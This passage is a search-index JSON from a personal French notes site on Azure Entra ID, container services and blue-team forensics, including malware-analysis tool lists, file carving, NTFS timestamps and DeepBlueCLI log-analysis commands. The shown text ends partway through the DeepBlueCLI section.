{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Le but de ce site est de condenser mes notes, notamment dans le domaine de la cybers\u00e9curit\u00e9. Il s'agit d'un projet que je maintiens sur mon temps libre, mais qui me tient particuli\u00e8rement \u00e0 c\u0153ur pour plusieurs raisons:</p> <ul> <li>J'aime transmettre le peu que je sais et essaye de le faire de la meilleure des mani\u00e8re, l'exercice est donc int\u00e9ressant :).</li> <li>\"Enseigner, c'est apprendre deux fois\" : faire une note sur un sujet en particulier \"m'oblige\" \u00e0 le creuser davantage, ne serait-ce que pour \u00eatre \u00e0 peu pr\u00e8s s\u00fbr de ne pas raconter totalement n'importe quoi ;).</li> <li>L'utiliser moi-m\u00eame, \u00e9videmment: \u00e9norm\u00e9ment de concepts, \u00e9norm\u00e9ment de technos... On ne peut pas envisager de tout avoir en t\u00eate \u00e0 chaque moment :).</li> </ul> <p>N'\u00e9tant qu'un simple humain, des erreurs ou approximations peuvent se glisser ici et l\u00e0. N'h\u00e9sitez pas \u00e0 me les communiquer !</p>"},{"location":"#certifications","title":"Certifications","text":""},{"location":"#prolabs","title":"Prolabs","text":"<p>![[Files/Pasted image 20240915003934.png]]</p>"},{"location":"Azure/Entra%20ID/Bases/","title":"Bases","text":""},{"location":"Azure/Entra%20ID/Bases/#licences","title":"Licences","text":"<ul> <li> <p>Microsoft Entra ID gratuit. Offre la gestion des utilisateurs et des groupes, la synchronisation d\u2019annuaires locaux, des rapports de base, des changements de mot de passe en libre-service pour les utilisateurs cloud ainsi que l\u2019authentification unique sur Azure, Microsoft\u00a0365 et bon nombre d\u2019applications SaaS populaires.</p> </li> <li> <p>Microsoft Entra ID P1. En plus des fonctionnalit\u00e9s Free, la licence P1 offre \u00e0 vos utilisateurs hybrides l\u2019acc\u00e8s aux ressources locales et cloud. Elle prend \u00e9galement en charge des fonctionnalit\u00e9s administratives avanc\u00e9es, notamment les groupes dynamiques, la gestion de groupes libre-service, Microsoft Identity Manager et la r\u00e9\u00e9criture dans le cloud pour faire b\u00e9n\u00e9ficier \u00e0 vos utilisateurs locaux de la r\u00e9initialisation de mot de passe en libre-service. </p> </li> <li> <p>Microsoft Entra ID P2. En plus des fonctionnalit\u00e9s Free et P1, la licence P2 offre Microsoft Entra ID Protection pour fournir un acc\u00e8s conditionnel en fonction des risques \u00e0 vos applications et aux donn\u00e9es critiques de l\u2019entreprise. Elle propose \u00e9galement Privileged Identity Management pour faciliter la d\u00e9couverte, la restriction et la supervision des administrateurs et leur acc\u00e8s aux ressources et, au besoin, fournir un acc\u00e8s juste-\u00e0-temps.  </p> </li> <li> <p>Licences pour les fonctionnalit\u00e9s avec \u00ab\u00a0paiement \u00e0 l\u2019utilisation\u00a0\u00bb. Vous pouvez \u00e9galement obtenir des licences pour des fonctionnalit\u00e9s, par exemple Microsoft Entra Business-to-Customer (B2C). B2C peut vous aider \u00e0 fournir des solutions de gestion d'identit\u00e9 et d'acc\u00e8s pour vos applications orient\u00e9es vers les clients.</p> </li> </ul> <p></p>"},{"location":"Azure/Entra%20ID/Bases/#fonctionnalites","title":"Fonctionnalit\u00e9s","text":"Cat\u00e9gorie Description Gestion des applications G\u00e9rez vos applications cloud et locales avec le proxy d\u2019application, l\u2019authentification unique, le portail Mes applications et les applications SaaS (software as a service). Authentification G\u00e9rez la r\u00e9initialisation de mot de passe en libre-service Microsoft\u00a0Entra, l\u2019authentification multifacteur, la liste de mots de passe interdits personnalis\u00e9 et le verrouillage intelligent. ID Microsoft Entra pour les d\u00e9veloppeurs Cr\u00e9ez des applications qui connectent toutes les identit\u00e9s Microsoft et obtiennent des jetons pour appeler Microsoft Graph, d\u2019autres API Microsoft ou des API personnalis\u00e9es. Entreprise-entreprise (B2B) G\u00e9rez vos utilisateurs invit\u00e9s et partenaires externes tout en conservant le contr\u00f4le de vos donn\u00e9es d\u2019entreprise. Entreprise-client (B2C) Personnalisez et contr\u00f4lez la fa\u00e7on dont les utilisateurs s\u2019inscrivent, se connectent et g\u00e8rent leurs profils quand ils utilisent vos applications. Acc\u00e8s conditionnel G\u00e9rez l\u2019acc\u00e8s \u00e0 vos applications cloud. Gestion des appareils G\u00e9rez la fa\u00e7on dont vos appareils cloud ou locaux acc\u00e8dent \u00e0 vos donn\u00e9es d\u2019entreprise. Services de domaine Joignez des machines virtuelles Azure \u00e0 un domaine sans contr\u00f4leur de domaine. Utilisateurs d\u2019entreprise G\u00e9rez les attributions de licences, acc\u00e9dez \u00e0 des applications et configurez des d\u00e9l\u00e9gu\u00e9s \u00e0 l\u2019aide de groupes et de r\u00f4les d\u2019administrateur. Identit\u00e9 hybride Utilisez Microsoft Entra Connect et Connect Health pour fournir une identit\u00e9 d\u2019utilisateur unique pour l\u2019authentification et l\u2019autorisation aupr\u00e8s de toutes les ressources, ind\u00e9pendamment de l\u2019emplacement (cloud ou local). Gouvernance des identit\u00e9s G\u00e9rez l\u2019identit\u00e9 de votre organisation au moyen de contr\u00f4les d\u2019acc\u00e8s pour vos employ\u00e9s, partenaires commerciaux, fournisseurs, services et applications. Vous pouvez \u00e9galement effectuer des r\u00e9visions d\u2019acc\u00e8s. Identity Protection D\u00e9tectez les vuln\u00e9rabilit\u00e9s potentielles qui affectent les identit\u00e9s de votre organisation, configurez des strat\u00e9gies pour r\u00e9pondre aux actions suspectes et prenez les mesures appropri\u00e9es pour les r\u00e9soudre. Identit\u00e9s g\u00e9r\u00e9es pour les ressources Azure Fournissez \u00e0 vos services Azure une identit\u00e9 manag\u00e9e automatiquement dans Microsoft Entra ID qui peut authentifier n\u2019importe quel service d\u2019authentification pris en charge par Microsoft Entra ID, notamment Key Vault. Privileged Identity Management (PIM) G\u00e9rez, contr\u00f4lez et supervisez l\u2019acc\u00e8s au sein de votre organisation. Cette fonctionnalit\u00e9 inclut l\u2019acc\u00e8s aux ressources dans Microsoft Entra ID et Azure, ainsi qu\u2019\u00e0 d\u2019autres services Microsoft Online, comme Microsoft\u00a0365 ou Intune. Supervision et int\u00e9grit\u00e9 Obtenez des insights sur la s\u00e9curit\u00e9 et les mod\u00e8les d\u2019utilisation de votre environnement. Identit\u00e9s de charge de travail Il s\u2019agit d\u2019une identit\u00e9 utilis\u00e9e par une charge de travail logicielle (telle qu\u2019une application, un service, un script ou un conteneur) pour authentifier et acc\u00e9der \u00e0 d\u2019autres services et ressources. ### Terminologie Terme ou concept Description Identit\u00e9 Une chose qui peut \u00eatre authentifi\u00e9e. Une identit\u00e9 peut \u00eatre un utilisateur avec un nom d\u2019utilisateur et un mot de passe. Les identit\u00e9s incluent \u00e9galement des applications ou autres serveurs qui peuvent n\u00e9cessiter l\u2019authentification via des cl\u00e9s secr\u00e8tes ou des certificats. Compte Une identit\u00e9 qui a des donn\u00e9es associ\u00e9es. Vous ne pouvez pas avoir de compte sans identit\u00e9. Compte Microsoft Entra Identit\u00e9 cr\u00e9\u00e9e par le biais Microsoft Entra ID ou d\u2019un autre service cloud Microsoft comme Microsoft\u00a0365. Les identit\u00e9s sont stock\u00e9es dans Microsoft Entra ID et sont accessibles \u00e0 tout abonnement \u00e0 un service cloud de votre organisation. Ce compte est parfois appel\u00e9 un compte professionnel ou scolaire. Administrateur de comptes Ce r\u00f4le d\u2019administrateur d\u2019abonnement classique est th\u00e9oriquement le propri\u00e9taire du compte de facturation d\u2019un abonnement. Ce r\u00f4le permet de g\u00e9rer tous les abonnements d\u2019un compte. Administrateur de services Ce r\u00f4le d\u2019administrateur d\u2019abonnement classique vous permet de g\u00e9rer toutes les ressources Azure, notamment l\u2019acc\u00e8s \u00e0 celles-ci. Ce r\u00f4le a un droit d\u2019acc\u00e8s \u00e9quivalent \u00e0 celui d\u2019un utilisateur qui se voit attribuer le r\u00f4le Propri\u00e9taire au niveau de l\u2019\u00e9tendue de l\u2019abonnement. Owner Ce r\u00f4le vous permet de g\u00e9rer toutes les ressources Azure, notamment l\u2019acc\u00e8s \u00e0 celles-ci. Ce r\u00f4le est bas\u00e9 sur un syst\u00e8me d\u2019autorisation plus r\u00e9cent appel\u00e9 \u00ab\u00a0contr\u00f4le d\u2019acc\u00e8s en fonction du r\u00f4le Azure\u00a0\u00bb (Azure RBAC) qui permet de g\u00e9rer avec pr\u00e9cision l\u2019acc\u00e8s aux ressources Azure. administrateur g\u00e9n\u00e9ral Microsoft Entra Ce r\u00f4le d\u2019administrateur est automatiquement attribu\u00e9 au cr\u00e9ateur du locataire Microsoft Entra. Vous pouvez avoir plusieurs administrateurs g\u00e9n\u00e9raux, mais seuls les administrateurs g\u00e9n\u00e9raux peuvent attribuer des r\u00f4les d\u2019administrateur (notamment d\u2019autres r\u00f4les d\u2019administrateur g\u00e9n\u00e9ral) aux utilisateurs. Abonnement Azure Permet de payer les services cloud Azure. Vous pouvez avoir plusieurs abonnements, lesquels sont li\u00e9s \u00e0 une carte de cr\u00e9dit. Client Azure Un instance d\u00e9di\u00e9 et approuv\u00e9 de Microsoft Entra ID. Le locataire est automatiquement cr\u00e9\u00e9 quand votre organisation s\u2019inscrit \u00e0 un abonnement de service cloud Microsoft. Ces abonnements comprennent Microsoft Azure, Microsoft Intune ou Microsoft\u00a0365. Un locataire Azure repr\u00e9sente une seule organisation. Locataire unique Un locataire Azure qui acc\u00e8de \u00e0 d\u2019autres services dans un environnement d\u00e9di\u00e9 est consid\u00e9r\u00e9 comme un locataire unique. Multi-locataire Les locataires Azure qui acc\u00e8dent \u00e0 d\u2019autres services dans un environnement partag\u00e9 entre plusieurs organisations sont consid\u00e9r\u00e9s comme multilocataires. R\u00e9pertoire Microsoft Entra Chaque locataire Azure dispose d'un r\u00e9pertoire Microsoft Entra d\u00e9di\u00e9 et fiable. L\u2019annuaire Microsoft Entra inclut les utilisateurs, groupes et applications du locataire. Il permet d\u2019effectuer les fonctions de gestion des identit\u00e9s et des acc\u00e8s pour les ressources des locataires. Domaine personnalis\u00e9 Chaque nouveau r\u00e9pertoire Microsoft Entra est fourni avec un nom de domaine initial, par exemple nomdomaine.onmicrosoft.com. En plus de ce nom initial, vous pouvez \u00e9galement ajouter les noms de domaine de votre organisation. Les noms de domaine de votre organisation incluent les noms que vous utilisez pour votre activit\u00e9 et que vos utilisateurs utilisent pour acc\u00e9der aux ressources de votre organisation, \u00e0 la liste. L\u2019ajout de noms de domaine personnalis\u00e9s vous permet de cr\u00e9er des noms d\u2019utilisateur qui sont familiers \u00e0 vos utilisateurs, par exemple alain@contoso.com. Compte Microsoft (\u00e9galement appel\u00e9 MSA) Comptes personnels qui permettent d\u2019acc\u00e9der \u00e0 vos produits et services cloud Microsoft orient\u00e9s consommateur. Ces produits et services comprennent Outlook, OneDrive, Xbox LIVE ou Microsoft\u00a0365. Votre compte Microsoft est cr\u00e9\u00e9 et stock\u00e9 dans le syst\u00e8me de comptes d\u2019identit\u00e9 des consommateurs de Microsoft."},{"location":"Azure/Entra%20ID/Bases/#types-dutilisateurs","title":"Types d'utilisateurs","text":"<ul> <li>Membre interne\u00a0: ces utilisateurs sont probablement des salari\u00e9s \u00e0 temps plein dans votre organisation.  </li> <li>Invit\u00e9 interne\u00a0: ces utilisateurs ont un compte dans votre locataire, mais disposent de privil\u00e8ges de niveau Invit\u00e9. Il est possible qu\u2019ils aient \u00e9t\u00e9 cr\u00e9\u00e9s au sein de votre locataire avant la disponibilit\u00e9 de B2B Collaboration.</li> <li>Membre externe\u00a0: ces utilisateurs s\u2019authentifient \u00e0 l\u2019aide d\u2019un compte externe, mais disposent d\u2019un acc\u00e8s membre \u00e0 votre locataire. Ces types d\u2019utilisateurs sont courants dans les organisations d\u2019architecture mutualis\u00e9es.</li> <li>Invit\u00e9 externe\u00a0: ces utilisateurs sont de v\u00e9ritables invit\u00e9s de votre locataire qui s\u2019authentifient \u00e0 l\u2019aide d\u2019une m\u00e9thode externe et qui disposent de privil\u00e8ges de niveau Invit\u00e9.</li> </ul> <p>Les m\u00e9thodes d\u2019authentification varient en fonction du type d\u2019utilisateur que vous cr\u00e9ez. Les invit\u00e9s et les membres internes ont des informations d\u2019identification dans votre locataire Microsoft Entra qui peuvent \u00eatre g\u00e9r\u00e9es par des administrateurs. Ces utilisateurs peuvent \u00e9galement r\u00e9initialiser leur propre mot de passe. Les membres externes s\u2019authentifient aupr\u00e8s de leur locataire Microsoft Entra d\u2019origine et votre locataire Microsoft Entra authentifie l\u2019utilisateur par le biais d\u2019une connexion f\u00e9d\u00e9r\u00e9e avec le locataire Microsoft Entra du membre externe. Si les membres externes oublient leur mot de passe, l\u2019administrateur de leur locataire Microsoft Entra peut le r\u00e9initialiser. Les invit\u00e9s externes configurent leur propre mot de passe \u00e0 l\u2019aide du lien qu\u2019ils re\u00e7oivent dans l\u2019e-mail lors de la cr\u00e9ation de leur compte.</p>"},{"location":"Azure/Entra%20ID/Entra%20Connect/","title":"Entra Connect","text":""},{"location":"Azure/Entra%20ID/Entra%20Connect/#fonctionnalites-de-microsoft-entra-connect","title":"Fonctionnalit\u00e9s de Microsoft Entra Connect","text":"<ul> <li>Synchronisation du hachage du mot de passe \u2013 m\u00e9thode de connexion qui synchronise le hachage du mot de passe AD sur site d'un utilisateur avec Microsoft Entra ID.</li> <li>Authentification directe\u00a0: m\u00e9thode d\u2019authentification qui permet aux utilisateurs d\u2019utiliser le m\u00eame mot de passe localement et dans le cloud, mais sans n\u00e9cessiter l\u2019infrastructure suppl\u00e9mentaire d\u2019un environnement f\u00e9d\u00e9r\u00e9.</li> <li>Int\u00e9gration de f\u00e9d\u00e9ration\u00a0: la f\u00e9d\u00e9ration est une partie facultative de Microsoft Entra Connect qui peut servir \u00e0 configurer un environnement hybride \u00e0 l\u2019aide d\u2019une infrastructure AD FS locale. Elle offre \u00e9galement des fonctionnalit\u00e9s de gestion AD FS telles que le renouvellement de certificat et les d\u00e9ploiements de serveurs AD FS suppl\u00e9mentaires.</li> <li>Synchronisation\u00a0: ce composant est charg\u00e9 de cr\u00e9er des utilisateurs, des groupes et d\u2019autres objets, et \u00e9galement de s\u2019assurer que les informations d\u2019identit\u00e9 relatives aux utilisateurs et aux groupes dans votre environnement local correspondent \u00e0 celles qui se trouvent dans le cloud. Cette synchronisation inclut \u00e9galement des hachages de mot de passe.</li> <li>Monitoring de l\u2019int\u00e9grit\u00e9\u00a0: Microsoft Entra Connect Health peut assurer une supervision robuste et offrir un emplacement central dans le centre d\u2019administration Microsoft Entra pour la visualisation de cette activit\u00e9.</li> </ul>"},{"location":"Azure/Entra%20ID/Entra%20Connect/#avantages-cles-et-bonnes-pratiques","title":"Avantages cl\u00e9s et bonnes pratiques\u00a0:","text":"Principaux avantages Meilleures pratiques S\u00e9curit\u00e9 am\u00e9lior\u00e9e Tendances de verrouillage extranetRapport sur les \u00e9checs de connexionsConformit\u00e9 aux r\u00e9glementations en mati\u00e8re de confidentialit\u00e9 Obtention d\u2019alertes pour tous les probl\u00e8mes critiques li\u00e9s au syst\u00e8me\u00a0ADFS Configuration et disponibilit\u00e9 de serveur   Performances et connectivit\u00e9 \u2013 Maintenance r\u00e9guli\u00e8re Facilit\u00e9 de d\u00e9ploiement et de gestion Installation rapide de l\u2019agentMise \u00e0 niveau automatique de l\u2019agent vers la derni\u00e8re versionDonn\u00e9es disponibles dans le portail en quelques minutes M\u00e9triques d\u2019utilisation enrichies Utilisation des principales applications  Emplacements r\u00e9seau et connexion TCP  Demandes de jetons par serveur Une meilleure exp\u00e9rience utilisateur Mode de tableau de bord \u00e0 partir du centre d\u2019administration Microsoft Entra   Alertes par e-mail"},{"location":"Azure/Entra%20ID/Entra%20Connect/#comparaison-entre-microsoft-entra-connect-et-la-synchronisation-cloud","title":"Comparaison entre Microsoft Entra Connect et la synchronisation cloud","text":"<p>Le tableau suivant permet de comparer Microsoft Entra Connect et Synchronisation cloud Microsoft Entra\u00a0:</p> Fonctionnalit\u00e9 Connect sync Synchronisation cloud Connexion \u00e0 une for\u00eat AD locale \u25cf \u25cf Connexion \u00e0 plusieurs for\u00eats\u00a0AD locales \u25cf \u25cf Connexion \u00e0 plusieurs for\u00eats\u00a0Active Directory locales d\u00e9connect\u00e9es \u25cf Mod\u00e8le d\u2019installation d\u2019agent l\u00e9ger \u25cf Plusieurs agents actifs pour la haute disponibilit\u00e9 \u25cf Connexion aux annuaires LDAP \u25cf Prise en charge des objets utilisateur \u25cf \u25cf Prise en charge des objets groupe \u25cf \u25cf Prise en charge des objets contact \u25cf \u25cf Prise en charge des objets appareil \u25cf Autorisation de la personnalisation de base pour les flux d\u2019attributs \u25cf \u25cf Synchronisation des attributs Exchange Online \u25cf \u25cf Synchronisation des attributs d\u2019extension 1-15 \u25cf \u25cf Synchronisation des attributs Active Directory d\u00e9finis par le client (extensions d\u2019annuaire) \u25cf \u25cf Prise en charge de la synchronisation de hachage de mot de passe \u25cf \u25cf Prise en charge de l\u2019authentification directe \u25cf Prise en charge de la f\u00e9d\u00e9ration \u25cf \u25cf Authentification unique transparente \u25cf \u25cf Installation des supports sur un contr\u00f4leur de domaine \u25cf \u25cf Prise en charge pour Windows Server\u00a02016 \u25cf \u25cf Filtrage sur les domaines/unit\u00e9s d\u2019organisation/groupes \u25cf \u25cf Filtrage sur les valeurs d\u2019attributs des objets \u25cf Autorisation d\u2019un ensemble minimal d\u2019attributs \u00e0 synchroniser (MinSync) \u25cf \u25cf Autoriser la suppression des attributs du flux d'AD vers Microsoft Entra ID \u25cf \u25cf Autorisation de la personnalisation avanc\u00e9e pour les flux d\u2019attributs \u25cf Prise en charge de la r\u00e9\u00e9criture du mot de passe \u25cf \u25cf Prise en charge de la r\u00e9\u00e9criture d\u2019appareil \u25cf Les clients doivent utiliser l\u2019approbation Kerberos cloud pour cette fonctionnalit\u00e9 Prise en charge de la r\u00e9\u00e9criture de groupe \u25cf \u25cf Prise en charge de la fusion des attributs utilisateur de plusieurs domaines \u25cf Prise en charge de Microsoft Entra Domain Services \u25cf \u00c9criture diff\u00e9r\u00e9e d\u2019Exchange hybride \u25cf \u25cf Nombre illimit\u00e9 d\u2019objets par domaine AD \u25cf Prise en charge d\u2019un maximum de 150\u00a0000 objets par domaine AD \u25cf \u25cf Groupes jusqu\u2019\u00e0 50\u00a0000\u00a0membres \u25cf \u25cf Grands groupes jusqu\u2019\u00e0 250\u00a0000\u00a0membres \u25cf R\u00e9f\u00e9rences entre les domaines \u25cf \u25cf Approvisionnement \u00e0 la demande \u25cf Prise en charge pour le gouvernement des \u00c9tats-Unis \u25cf \u25cf"},{"location":"Azure/Entra%20ID/Entra%20Identity%20Protection/","title":"Entra Identity Protection","text":""},{"location":"Azure/IaaS/VM/","title":"VM","text":"<p>Cr\u00e9ation d'une VM en powershell: <pre><code>az vm create \\\n  --resource-group \"[sandbox resource group name]\" \\\n  --name my-vm \\\n  --public-ip-sku Standard \\\n  --image Ubuntu2204 \\\n  --admin-username azureuser \\\n  --generate-ssh-keys\n</code></pre></p>"},{"location":"Azure/PaaS/Containers/","title":"Containers","text":""},{"location":"Azure/PaaS/Containers/#azure-container-instances","title":"Azure Container Instances","text":"<p>Azure Container Instances offre le moyen le plus rapide et le plus simple d\u2019ex\u00e9cuter un conteneur dans Azure, sans avoir \u00e0 g\u00e9rer les machines virtuelles ou \u00e0 adopter des services suppl\u00e9mentaires. Azure Container Instances est une offre PaaS (Platform as a Service). Azure Container Instances vous permet de t\u00e9l\u00e9charger vos conteneurs, le service ex\u00e9cute alors les conteneurs \u00e0 votre place.</p>"},{"location":"Azure/PaaS/Containers/#azure-container-apps","title":"Azure Container Apps","text":"<p>La plateforme Azure\u00a0Container\u00a0Apps est similaire \u00e0 bien des \u00e9gards \u00e0 une instance de conteneur. Elle vous permettent d\u2019\u00eatre op\u00e9rationnel imm\u00e9diatement, suppriment l\u2019\u00e9l\u00e9ment de gestion de conteneurs et constituent une offre PaaS. Container\u00a0Apps offre des avantages suppl\u00e9mentaires, tels que la possibilit\u00e9 d\u2019incorporer un \u00e9quilibrage de charge et une mise \u00e0 l\u2019\u00e9chelle. Ces autres fonctions vous permettent d\u2019\u00eatre plus \u00e9lastique dans votre conception.</p>"},{"location":"Azure/PaaS/Containers/#azure-kubernetes-service","title":"Azure Kubernetes Service","text":"<p>Azure\u00a0Kubernetes\u00a0Service (AKS) est un service d\u2019orchestration de conteneurs. Un service d\u2019orchestration g\u00e8re le cycle de vie de conteneurs. Lorsque vous d\u00e9ployez une flotte de conteneurs, AKS peut rendre la gestion de la flotte plus simple et plus efficace.</p>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/","title":"Outils en ligne","text":"<p>Scanner d'url: https://urlscan.io/</p> <p>Couteau suisse pour tout ce qui est encodage/d\u00e9codage: https://gchq.github.io/CyberChef/</p> <p>V\u00e9rifier l\u00e9gitimit\u00e9 d'un hash, d'une url, d'un fichier... : https://www.virustotal.com/</p> <p>Evaluer la confiance en un domaine ou un mail (utile pour spam/phishing): https://fr.scamdoc.com/</p> <p>Sandbox: - https://app.any.run/ - https://cuckoosandbox.org/ - https://www.joesandbox.com/#windows</p> <p>Base de donn\u00e9es d'exploit: https://exploit-db.com</p> <p>Whois: https://www.whois.com/whois/</p> <p>Sandbox browser: https://www.browserling.com/</p>"},{"location":"Blue%20Team/Analyse/Malware/Tools/","title":"Tools","text":"<ul> <li>Anlyz</li> <li>Any.run</li> <li>Comodo Valkyrie</li> <li>Cuckoo</li> <li>Hybrid Analysis</li> <li>Intezer Analyze</li> <li>SecondWrite Malware Deepview</li> <li>Jevereg</li> <li>IObit Cloud</li> <li>BinaryGuard</li> <li>BitBlaze</li> <li>SandDroid</li> <li>Joe Sandbox</li> <li>AMAaaS</li> <li>IRIS-H</li> <li>Gatewatcher Intelligence</li> <li>Hatching Triage </li> <li>InQuest Labs</li> <li>Manalyzer</li> <li>SandBlast Analysis</li> <li>SNDBOX</li> <li>firmware</li> <li>opswat</li> <li>virusade</li> <li>virustotal</li> <li>malware config</li> <li>malware hunter team</li> <li>virscan </li> <li>jotti</li> </ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/","title":"OleTools","text":"<ul> <li>oleid: to analyze OLE files to detect specific characteristics usually found in malicious files.</li> <li>olevba: to extract and analyze VBA Macro source code from MS Office documents (OLE and OpenXML).</li> <li>mraptor: to detect malicious VBA Macros</li> <li>msodde: to detect and extract DDE/DDEAUTO links from MS Office documents, RTF and CSV</li> <li>pyxswf: to detect, extract and analyze Flash objects (SWF) that may be embedded in files such as MS Office documents (e.g. Word, Excel) and RTF, which is especially useful for malware analysis.</li> <li>oleobj: to extract embedded objects from OLE files.</li> <li>rtfobj: to extract embedded objects from RTF files.</li> <li>olebrowse: A simple GUI to browse OLE files (e.g. MS Word, Excel, Powerpoint documents), to view and extract individual data streams.</li> <li>olemeta: to extract all standard properties (metadata) from OLE files.</li> <li>oletimes: to extract creation and modification timestamps of all streams and storages.</li> <li>oledir: to display all the directory entries of an OLE file, including free and orphaned entries.</li> <li>olemap: to display a map of all the sectors in an OLE file.</li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/DNS%20tunneling/","title":"DNS tunneling","text":"<p>Dans le cas o\u00f9 un attaquant a utilis\u00e9 un outil de tunnel DNS pour cacher ses activit\u00e9s, le traffic peut \u00eatre d\u00e9cod\u00e9 avec l'outil dnscat-decoder :</p> <p>https://github.com/micksmix/DNSCatDecoder</p> <p></p> <p></p>"},{"location":"Blue%20Team/Forensic/Disque/Dump%20disque/","title":"Dump disque","text":"<p>FTK Image : https://www.exterro.com/ftk-imager</p>"},{"location":"Blue%20Team/Forensic/Disque/Fichiers%20effac%C3%A9s/","title":"Fichiers effac\u00e9s","text":""},{"location":"Blue%20Team/Forensic/Disque/Fichiers%20effac%C3%A9s/#scalpel","title":"Scalpel","text":"<p>Modifier dans /etc/scalpel/scalpel.conf les types de fichiers qui sont \u00e0 chercher.</p> <p>puis:</p> <pre><code>scalpel -o /home/pak/Output Disk.img\n</code></pre>"},{"location":"Blue%20Team/Forensic/Disque/MAC%28b%29%20Times%20%28NTFS%29/","title":"MAC(b) Times (NTFS)","text":"<ul> <li><code>Modified Time (M)</code>: Ce timestamp capture la derni\u00e8re instance o\u00f9 le contenu du fichier a \u00e9t\u00e9 modifi\u00e9. Toute alt\u00e9ration des donn\u00e9es du fichier, telle que des modifications du contenu, d\u00e9clenche une mise \u00e0 jour de ce timestamp.</li> <li><code>Accessed Time (A)</code>: Ce timestamp refl\u00e8te la derni\u00e8re occasion o\u00f9 le fichier a \u00e9t\u00e9 acc\u00e9d\u00e9 ou lu, se mettant \u00e0 jour chaque fois que le fichier est ouvert ou consult\u00e9.</li> <li><code>Changed [Change in MFT Record] (C)</code>: Ce timestamp signifie des changements dans l'enregistrement MFT. Il capture le moment o\u00f9 le fichier a \u00e9t\u00e9 initialement cr\u00e9\u00e9. Cependant, il est important de noter que certains syst\u00e8mes de fichiers, comme NTFS, peuvent mettre \u00e0 jour ce timestamp si le fichier est d\u00e9plac\u00e9 ou copi\u00e9.</li> <li><code>Birth Time (b)</code>: Souvent appel\u00e9 timestamp de naissance ou de cr\u00e9ation, il repr\u00e9sente le moment pr\u00e9cis o\u00f9 le fichier ou l'objet a \u00e9t\u00e9 cr\u00e9\u00e9 sur le syst\u00e8me de fichiers. Son importance dans les investigations forensic ne doit pas \u00eatre sous-estim\u00e9e, notamment pour d\u00e9terminer le moment de cr\u00e9ation initiale d'un fichier.</li> </ul>"},{"location":"Blue%20Team/Forensic/Disque/MAC%28b%29%20Times%20%28NTFS%29/#creation-de-fichier","title":"Cr\u00e9ation de Fichier :","text":"<ul> <li>Modified Timestamp (M) : Le timestamp de modification est mis \u00e0 jour pour refl\u00e9ter l'heure de la cr\u00e9ation du fichier.</li> <li>Accessed Timestamp (A) : Le timestamp d'acc\u00e8s est mis \u00e0 jour pour refl\u00e9ter que le fichier a \u00e9t\u00e9 acc\u00e9d\u00e9 au moment de sa cr\u00e9ation.</li> <li>Birth (Created) Timestamp (b) : Le timestamp de naissance est d\u00e9fini \u00e0 l'heure de cr\u00e9ation du fichier.</li> </ul>"},{"location":"Blue%20Team/Forensic/Disque/MAC%28b%29%20Times%20%28NTFS%29/#modification-de-fichier","title":"Modification de Fichier :","text":"<ul> <li>Modified Timestamp (M) : Le timestamp de modification est mis \u00e0 jour pour refl\u00e9ter l'heure \u00e0 laquelle le contenu ou les attributs du fichier ont \u00e9t\u00e9 modifi\u00e9s pour la derni\u00e8re fois.</li> <li>Accessed Timestamp (A) : Le timestamp d'acc\u00e8s n'est pas mis \u00e0 jour lorsque le fichier est modifi\u00e9.</li> <li>Birth (Created) Timestamp (b) : Le timestamp de naissance n'est pas mis \u00e0 jour lorsque le fichier est modifi\u00e9.</li> </ul>"},{"location":"Blue%20Team/Forensic/Disque/MAC%28b%29%20Times%20%28NTFS%29/#copie-de-fichier","title":"Copie de Fichier :","text":"<ul> <li>Modified Timestamp (M) : Le timestamp de modification n'est g\u00e9n\u00e9ralement pas mis \u00e0 jour lorsqu'un fichier est copi\u00e9. Il h\u00e9rite habituellement du timestamp du fichier source.</li> <li>Accessed Timestamp (A) : Le timestamp d'acc\u00e8s est mis \u00e0 jour pour refl\u00e9ter que le fichier a \u00e9t\u00e9 acc\u00e9d\u00e9 au moment de la copie.</li> <li>Birth (Created) Timestamp (b) : Le timestamp de naissance est mis \u00e0 jour \u00e0 l'heure de la copie, indiquant le moment o\u00f9 la copie a \u00e9t\u00e9 cr\u00e9\u00e9e.</li> </ul>"},{"location":"Blue%20Team/Forensic/Disque/MAC%28b%29%20Times%20%28NTFS%29/#acces-au-fichier","title":"Acc\u00e8s au Fichier :","text":"<ul> <li>Modified Timestamp (M) : Le timestamp de modification n'est pas mis \u00e0 jour lorsque le fichier est acc\u00e9d\u00e9.</li> <li>Accessed Timestamp (A) : Le timestamp d'acc\u00e8s est mis \u00e0 jour pour refl\u00e9ter l'heure de l'acc\u00e8s.</li> <li>Birth (Created) Timestamp (b) : Le timestamp de naissance n'est pas mis \u00e0 jour lorsque le fichier est acc\u00e9d\u00e9.</li> </ul>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/","title":"DeepBlueCli","text":""},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyse-de-journaux-devenements","title":"Analyse de Journaux d'\u00c9v\u00e9nements","text":"<p>Analyser un journal d'\u00e9v\u00e9nements sp\u00e9cifique</p> <pre><code>.\\DeepBlue.ps1 .\\chemin\\vers\\le\\fichier\\journal.evtx`\n</code></pre> <p>Analyser un journal d'\u00e9v\u00e9nements depuis un serveur distant</p> <pre><code>Get-WinEvent -LogName Security -ComputerName ServeurDistant | .\\DeepBlue.ps1\n</code></pre> <p>Analyser des journaux d'\u00e9v\u00e9nements en temps r\u00e9el</p> <pre><code>Get-WinEvent -LogName Security -MaxEvents 100 | .\\DeepBlue.ps1\n</code></pre> <p>Analyser les derniers \u00e9v\u00e9nements d'un journal</p> <pre><code>Get-WinEvent -LogName Security -MaxEvents 100 | .\\DeepBlue.ps1\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#analyse-specifique","title":"Analyse Sp\u00e9cifique","text":"<p>Analyser pour des commandes PowerShell suspectes</p> <pre><code>.\\DeepBlue.ps1 -log PowerShell\n</code></pre> <p>Analyser pour des activit\u00e9s suspectes dans les journaux de s\u00e9curit\u00e9</p> <pre><code>.\\DeepBlue.ps1 -log Security\n</code></pre> <p>Analyser pour des processus suspects dans les journaux de syst\u00e8me</p> <pre><code>.\\DeepBlue.ps1 -log System\n</code></pre> <p>Analyser pour des activit\u00e9s suspectes dans les journaux d'application</p> <pre><code>.\\DeepBlue.ps1 -log 